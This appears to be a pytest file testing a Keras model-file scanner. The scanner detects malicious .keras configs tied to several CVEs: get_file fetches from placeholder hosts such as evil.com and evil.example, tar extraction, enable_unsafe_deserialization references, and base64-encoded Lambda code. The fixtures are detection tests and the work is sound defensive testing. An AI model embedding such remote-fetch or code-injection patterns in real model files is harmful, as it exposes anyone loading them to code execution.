            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "args": ["https://evil.com/payload.bin"],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL in args list as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_with_url_in_nested_kwargs_detected(self, tmp_path: Path) -> None:
        """Nested kwargs URL should still be attributed to the get_file invocation."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "kwargs": {"url": "https://evil.com/payload.bin"},
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1, "Should detect get_file + URL in nested kwargs as CVE-2025-8747"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL

    def test_get_file_extract_tar_url_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """get_file(extract=True) with a remote tar URL should be attributed to CVE-2025-12060."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.tar.gz",
                            "extract": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        details = cve_issues[0].details
        assert details["cvss"] == 8.8
        assert details["cwe"] == "CWE-22"
        assert "remediation" in details
        assert details["urls"] == ["https://evil.example/payload.tar.gz"]

    def test_get_file_extract_tar_url_in_kwargs_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """kwargs.origin plus kwargs.extract=True should be treated as a get_file extraction call."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "kwargs": {
                                "origin": "https://evil.example/payload.tgz",
                                "extract": True,
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["urls"] == ["https://evil.example/payload.tgz"]

    def test_get_file_extract_tar_url_fragment_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """URL fragments must not hide tar extraction gadgets from CVE attribution."""
        scanner = KerasZipScanner()
        archive_url = "https://user:pass@evil.example/payload.tar.gz?token=SECRET#comment-token"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": archive_url,
                            "extract": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        details = cve_issues[0].details
        assert details["urls"] == ["https://evil.example/payload.tar.gz"]
        assert "user" not in str(details)
        assert "pass" not in str(details)
        assert "SECRET" not in str(details)
        assert "comment-token" not in str(details)

    def test_get_file_extract_tar_url_fragment_in_kwargs_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """kwargs.origin fragments should remain part of the detected archive URL."""
        scanner = KerasZipScanner()
        archive_url = "https://evil.example/payload.tgz#fragment"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "kwargs": {
                                "origin": archive_url,
                                "extract": True,
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == ["https://evil.example/payload.tgz"]

    def test_get_file_positional_extract_tar_url_detects_cve_2025_12060(self, tmp_path: Path) -> None:
        """Positional get_file args with extract=True should receive CVE attribution."""
        scanner = KerasZipScanner()
        archive_url = "https://evil.example/payload.tar.zst"
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "keras.utils.get_file",
                            "args": ["payload.tar.zst", archive_url, False, None, None, "datasets", "auto", True],
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["urls"] == [archive_url]

    def test_get_file_tar_url_without_extract_true_no_cve_2025_12060(self, tmp_path: Path) -> None:
        """Tar URLs are only CVE-2025-12060 when the same get_file call extracts them."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.tar.gz",
                            "extract": False,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]

    def test_get_file_extract_non_archive_url_no_cve_2025_12060(self, tmp_path: Path) -> None:
        """extract=True on a non-tar URL is not enough for the tar extraction CVE."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.example/payload.bin",
                            "extract": True,
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]

    def test_get_file_metadata_extract_tar_url_no_cve_2025_12060(self, tmp_path: Path) -> None:
        """Metadata nested beside get_file should not be mistaken for get_file extraction args."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "metadata": {
                                "origin": "https://evil.example/payload.tar.gz",
                                "extract": True,
                            },
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]

    def test_get_file_with_nested_metadata_url_not_flagged(self, tmp_path: Path) -> None:
        """Nested metadata URLs in the same node should not be treated as get_file arguments."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "metadata": {"homepage": "https://example.com/model-docs"},
                            "path": "/local/file.h5",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert cve_issues == [], "Nested metadata URLs should not trigger CVE-2025-8747"

    def test_get_file_with_url_and_comment_token_detected(self, tmp_path: Path) -> None:
        """Embedded comment tokens in URL strings should not suppress detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {
                            "fn": "get_file",
                            "url": "https://evil.com/payload.bin#comment-token",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["cve_id"] == "CVE-2025-8747"

    def test_get_file_without_url_no_trigger(self, tmp_path: Path) -> None:
        """Config with get_file but no URL should NOT trigger."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"fn": "get_file", "path": "/local/file.h5"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0, "get_file without URL should not trigger"

    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
        """Normal config should not trigger CVE-2025-8747."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0

    def test_get_file_and_url_in_different_contexts_not_flagged(self, tmp_path: Path) -> None:
        """Keyword co-occurrence across unrelated dicts should not trigger CVE."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Model",
            "config": {
                "layers": [{"class_name": "Dense", "name": "dense_1", "config": {"fn": "get_file"}}],
                "metadata": {"download_url": "https://example.com/model-info"},
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) == 0, "get_file and URL in unrelated contexts should not trigger CVE-2025-8747"

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE details should be in issue details."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "d",
                            "config": {
                                "fn": "get_file",
                                "url": "http://evil.com/x",
                            },
                        }
                    ]
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-8747"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-8747"
        assert details["cvss"] == 8.8
        assert details["cwe"] == "CWE-502"
        assert details["description"]
        assert "3.11.0" in details["remediation"]


class TestCVE20259906UnsafeDeserialization:
    """Test CVE-2025-9906: enable_unsafe_deserialization config bypass detection."""

    def _make_keras_zip(self, config_str: str, tmp_path: Path) -> str:
        """Helper to create a .keras ZIP with raw config string."""
        return _build_test_keras_zip(config_str, tmp_path, "3.0.0")

    def test_enable_unsafe_deserialization_detected(self, tmp_path: Path) -> None:
        """Config referencing enable_unsafe_deserialization should be CRITICAL."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "module": "keras.config",
                        "config": {
                            "fn": "enable_unsafe_deserialization",
                        },
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1, "Should detect enable_unsafe_deserialization reference"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
        assert len(cve_checks) >= 1
        assert any(c.status != CheckStatus.PASSED for c in cve_checks)

    def test_enable_unsafe_deserialization_in_nested_value(self, tmp_path: Path) -> None:
        """enable_unsafe_deserialization anywhere in config should be detected."""
        scanner = KerasZipScanner()
        # Embed the string in a deeply nested config value
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [],
                    "metadata": {"loader": "keras.config.enable_unsafe_deserialization"},
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-9906: Unsafe Deserialization Bypass"]
        assert len(cve_checks) >= 1
        assert any(c.status != CheckStatus.PASSED for c in cve_checks)

    def test_no_false_positive_normal_config(self, tmp_path: Path) -> None:
        """Normal config without enable_unsafe_deserialization should be clean."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "dense_1",
                        "config": {"units": 10},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0, "Normal config should not trigger CVE-2025-9906"

    def test_cve_attribution_details(self, tmp_path: Path) -> None:
        """CVE details should be present in issue details."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "name": "d",
                            "module": "keras.config",
                            "config": {"fn": "enable_unsafe_deserialization"},
                        }
                    ]
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1
        details = cve_issues[0].details
        assert details["cve_id"] == "CVE-2025-9906"
        assert details["cwe"] == "CWE-502"
        assert details["cvss"] == 8.6
        assert details["description"]
        assert details["config_path"] == "config.json"
        assert details["matched_symbol"] == "enable_unsafe_deserialization"
        assert details["detection_method"] in {"structured_config_scan", "raw_config_scan"}

    def test_plain_text_mention_without_keras_context_not_flagged(self, tmp_path: Path) -> None:
        """A plain text mention should not trigger when no keras.config context exists."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [],
                    "notes": "This doc mentions enable_unsafe_deserialization for awareness only",
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_cross_object_tokens_do_not_trigger_false_positive(self, tmp_path: Path) -> None:
        """Separate context/token in different objects should not trigger CVE."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [
                        {"class_name": "Dense", "name": "d1", "config": {"fn": "enable_unsafe_deserialization"}},
                        {"class_name": "Dense", "name": "d2", "module": "keras.config", "config": {"units": 16}},
                    ],
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0, "Cross-object token co-occurrence should not trigger CVE-2025-9906"

    def test_comment_token_does_not_suppress_malicious_detection(self, tmp_path: Path) -> None:
        """Embedding a single comment token should not suppress CVE detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "d",
                        "module": "keras.config",
                        "config": {"fn": "enable_unsafe_deserialization", "notes": "#"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1

    def test_documentation_text_with_bare_config_words_stays_documentation(self) -> None:
        """Bare prose mentions of config/module should not stop doc-like scoring."""
        text = "\n".join(
            [
                "This model config includes safe defaults and explanatory guidance only",
                "The module description here is narrative text for documentation readers",
                "Another long descriptive line for awareness and onboarding context",
            ]
        )

        assert KerasZipScanner._is_primarily_documentation_text(text) is True

    def test_dangerous_line_does_not_count_toward_documentation_ratio(self) -> None:
        """Dangerous literals must not inflate the documentation ratio."""
        text = "\n".join(
            [
                "This line is harmless documentation padding only",
                "This warning mentions keras.config.enable_unsafe_deserialization as prose only",
            ]
        )

        assert KerasZipScanner._is_primarily_documentation_text(text) is False

    def test_malformed_json_with_executable_raw_reference_is_detected(self, tmp_path: Path) -> None:
        """Malformed JSON should still trigger raw fallback when executable keys are present."""
        scanner = KerasZipScanner()
        config_str = (
            '{"class_name":"Sequential","config":{"module":"keras.config","fn":"enable_unsafe_deserialization",}'
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["detection_method"] == "raw_config_scan"
        parse_checks = [c for c in result.checks if c.name == "Config JSON Parsing"]
        assert len(parse_checks) == 1
        assert parse_checks[0].status != CheckStatus.PASSED
        assert result.success is False

    def test_malformed_json_doc_symbol_without_executable_context_not_flagged(self, tmp_path: Path) -> None:
        """Malformed JSON documentation mentions alone must not trigger the raw fallback."""
        scanner = KerasZipScanner()
        config_str = (
            '{"description":"This documentation mentions '
            'keras.config.enable_unsafe_deserialization for awareness only",'
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_malformed_json_split_object_context_not_flagged(self, tmp_path: Path) -> None:
        """Module and function keys in different objects must not combine into a raw finding."""
        scanner = KerasZipScanner()
        config_str = '{"layers":[{"module":"keras.config"},{"fn":"enable_unsafe_deserialization"}],'

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_invalid_utf8_config_bytes_still_trigger_raw_fallback(self, tmp_path: Path) -> None:
        """Invalid UTF-8 should still use the raw fallback instead of bypassing detection."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "invalid_utf8.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", b'{"loader":"keras.config.enable_unsafe_deserialization",\xff')
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = scanner.scan(str(keras_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["detection_method"] == "raw_config_scan"
        parse_checks = [c for c in result.checks if c.name == "Config JSON Parsing"]
        assert len(parse_checks) == 1
        assert parse_checks[0].status != CheckStatus.PASSED
        assert result.success is False

    def test_benign_documentation_text_stays_clean(self, tmp_path: Path) -> None:
        """Benign long-form documentation text should not trigger CVE checks."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "notes": (
                        "This documentation example mentions keras.config.enable_unsafe_deserialization "
                        "for awareness only\n"
                        "Another long descriptive line for awareness and guidance\n"
                        "Helpful prose about model metadata and no executable content"
                    ),
                    "description": "Documentation for awareness and onboarding only",
                },
            }
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_description_text_without_dangerous_tokens_not_flagged(self, tmp_path: Path) -> None:
        """Config descriptions should remain clean when dangerous symbols are absent."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "description": (
                    "This model config includes many words to document architecture choices\n"
                    "Padding text for readability and transparency without any dangerous references"
                ),
                "config": {"layers": [{"class_name": "Dense", "config": {"units": 4}}]},
            }
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0


class TestCVE20243660LambdaAttribution:
    """Test CVE-2024-3660: Lambda layer code injection attribution."""

    def _make_keras_zip(self, config: dict[str, Any], tmp_path: Path, keras_version: str = "2.10.0") -> str:
        return _build_test_keras_zip(config, tmp_path, keras_version)

    def test_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path) -> None:
        """Lambda layer in .keras file should include CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) >= 1, "Lambda should have CVE-2024-3660 attribution"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["cve_id"] == "CVE-2024-3660"
        assert cve_issues[0].details["cvss"] == 9.8
        assert cve_issues[0].details["cwe"] == "CWE-94"
        assert cve_issues[0].details["description"]
        assert cve_issues[0].details["remediation"]
        assert cve_issues[0].details["layer_name"] == "my_lambda"

    @pytest.mark.parametrize(
        "layer_class",
        [
            "keras.layers.Lambda",
            "tf_keras.src.layers.core.lambda_layer.Lambda",
        ],
    )
    def test_fully_qualified_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path, layer_class: str) -> None:
        """Keras-qualified Lambda class names should use Lambda-specific ZIP checks."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"exec('print(1)')").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": layer_class,
                        "name": "qualified_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
        assert len(cve_issues) == 1
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert len(dangerous_lambda) == 1
        assert dangerous_lambda[0].details["layer_name"] == "qualified_lambda"

    def test_custom_namespace_lambda_layer_not_attributed_to_keras_zip_cve(self, tmp_path: Path) -> None:
        """Custom classes ending in Lambda should not be treated as Keras Lambda."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"exec('print(1)')").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "myproject.layers.Lambda",
                        "name": "custom_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
        dangerous_lambda = [check for check in result.checks if check.name == "Dangerous Lambda Layer"]
        custom_layer_checks = [
            check
            for check in result.checks
            if check.name == "Custom Layer Class Detection"
            and check.details.get("layer_class") == "myproject.layers.Lambda"
        ]
        assert cve_issues == []
        assert dangerous_lambda == []
        assert len(custom_layer_checks) == 1

    def test_no_cve_without_lambda(self, tmp_path: Path) -> None:
        """Non-Lambda model should NOT have CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) == 0

    def test_no_cve_for_fixed_keras_version(self, tmp_path: Path) -> None:
        """Lambda in fixed Keras version should not be CVE-attributed."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        keras_path = tmp_path / "model_fixed.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "2.13.0"}))

        result = scanner.scan(str(keras_path))
        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) == 0

    def test_cve_for_two_part_keras_version(self, tmp_path: Path) -> None:
        """Lambda in Keras 2.10 (two-part version) should be CVE-attributed."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version="2.10"))
        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) >= 1, "Keras 2.10 should be attributed as vulnerable"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL


class TestKerasZipScannerSubclassed:
    """Tests for subclassed model detection in ZIP format."""

    def test_allows_known_safe_model_classes_in_zip(self, tmp_path):
        """Test that scanner passes for known safe model classes."""
        from modelaudit.scanners.base import CheckStatus

        scanner = KerasZipScanner()

        for model_class in ["Sequential", "Functional", "Model"]:
            keras_path = tmp_path / f"model_{model_class}.keras"

            with zipfile.ZipFile(keras_path, "w") as zf:
                config = {
                    "class_name": model_class,
                    "config": {
                        "name": "test_model",
                        "layers": [
                            {"class_name": "Dense", "config": {"units": 10}},
                        ],
                    },
                }
                zf.writestr("config.json", json.dumps(config))
                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

            result = scanner.scan(str(keras_path))

            subclass_issues = [i for i in result.issues if "subclassed" in i.message.lower()]
            assert len(subclass_issues) == 0, f"{model_class} should not be flagged as subclassed"

            subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
            assert len(subclass_checks) > 0
            assert all(c.status == CheckStatus.PASSED for c in subclass_checks)
